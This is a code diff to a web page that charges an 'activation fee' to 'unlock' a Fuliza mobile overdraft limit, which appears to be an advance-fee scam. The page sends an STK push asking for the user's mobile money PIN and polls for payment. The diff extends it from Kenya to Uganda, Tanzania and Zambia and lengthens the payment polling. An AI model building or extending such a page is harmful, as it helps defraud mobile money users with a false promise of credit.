@@ -33,7 +33,7 @@ Pay your activation fee today to unlock your desired Fuliza limit instantly. Ens
 <div class="info">Selected Limit: <strong id="limit"></strong></div>
 <div class="info">Activation Fee: <strong id="fee"></strong></div>
 
-<input type="tel" id="phone" placeholder="Enter your phone number starting with (+254XXXXXXXX / 254XXXXXXXX)">
+<input type="tel" id="phone" placeholder="Enter your phone number starting with country code (+254, 254, +256, 256, +255, 255, +260, 260)">
 
 <button class="pay-btn" onclick="payNow()">Pay Activation Fee Now</button>
 
@@ -52,41 +52,65 @@ const activationFee = localStorage.getItem("activationFee") || 50;
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 document.getElementById("fee").innerText = "KSh " + activationFee;
 
-// Country codes mapping by prefix
+// Country codes mapping
 const countryPrefixes = { '254': 'KE', '256': 'UG', '255': 'TZ', '260': 'ZM' };
 const defaultNetwork = { 'KE': 'MPESA', 'UG': 'MTN', 'TZ': 'TIGO', 'ZM': 'ZAMTEL' };
 
 // Normalize phone and detect country
 function normalizePhone(input){
-  let phone = input.trim()
- if(phone.startsWith('+')) phone = '254' + phone.substring(1); // assume KE for local format
-  const prefix = phone.substring(0,3);
-  const country = countryPrefixes[prefix];
-  return { phone: country === 'KE' ? phone : '+' + phone, country };
+  let phone = input.trim();
+  let country = null;
+
+  // Must start with country code
+  if(phone.startsWith('+')){
+    const prefix = phone.substring(1,4);
+    country = countryPrefixes[prefix];
+    if(country === 'KE') phone = '254' + phone.substring(4); // Convert KE
+  } else {
+    const prefix = phone.substring(0,3);
+    country = countryPrefixes[prefix];
+  }
+
+  return { phone, country };
 }
 
+// Disable button while processing
+function setButtonState(enabled){
+  document.querySelector(".pay-btn").disabled = !enabled;
+}
+
+// Initiate payment
 async function payNow(){
   const phoneInput = document.getElementById("phone").value;
   const msg = document.getElementById("message");
   const spinner = document.getElementById("spinner");
 
   msg.innerText = "";
+
   if(!phoneInput){
     msg.innerText = "Enter your phone number";
     msg.style.color = "red";
     return;
   }
 
+  // Reject numbers starting with 07 or 01
+  if(phoneInput.startsWith('07') || phoneInput.startsWith('01')){
+    msg.innerText = "Phone number must start with country code (e.g., +254)";
+    msg.style.color = "red";
+    return;
+  }
+
   const { phone: phoneToSend, country } = normalizePhone(phoneInput);
+
   if(!country){
-    msg.innerText = "Invalid phone number,Kindly start with +254.";
+    msg.innerText = "Invalid phone number. Must start with +254, 254, +256, 256, +255, 255, +260, or 260.";
     msg.style.color = "red";
     return;
   }
 
   const network = defaultNetwork[country];
-
   spinner.style.display = "block";
+  setButtonState(false);
   msg.innerText = "Initiating payment... please check your phone.";
   msg.style.color = "black";
 
@@ -107,28 +131,32 @@ async function payNow(){
     if(data.success){
       msg.innerText="STK Push sent ✅ Enter your mobile money PIN to confirm...";
       msg.style.color="green";
-      checkPayment(data.reference, "payment2.html");
+      checkPayment(data.reference, "success.html");
     } else {
       msg.innerText="Payment failed: " + (data.message || "Please try again");
       msg.style.color="red";
+      setButtonState(true);
     }
 
   } catch(err){
     spinner.style.display = "none";
     msg.innerText="Server error: " + (err.message || "Try again");
     msg.style.color="red";
+    setButtonState(true);
   }
 }
 
+// Poll payment status
 async function checkPayment(reference, nextPage){
   const msg = document.getElementById("message");
   let attempts = 0;
   const interval = setInterval(async ()=>{
     attempts++;
-    if(attempts>20){
+    if(attempts>40){
       clearInterval(interval);
       msg.innerText="Payment timeout. Please retry.";
       msg.style.color="red";
+      setButtonState(true);
       return;
     }
     try{
@@ -146,6 +174,7 @@ async function checkPayment(reference, nextPage){
           clearInterval(interval);
           msg.innerText="Payment failed: " + (data.data.message || status);
           msg.style.color="red";
+          setButtonState(true);
         }
       }
     } catch(e){}
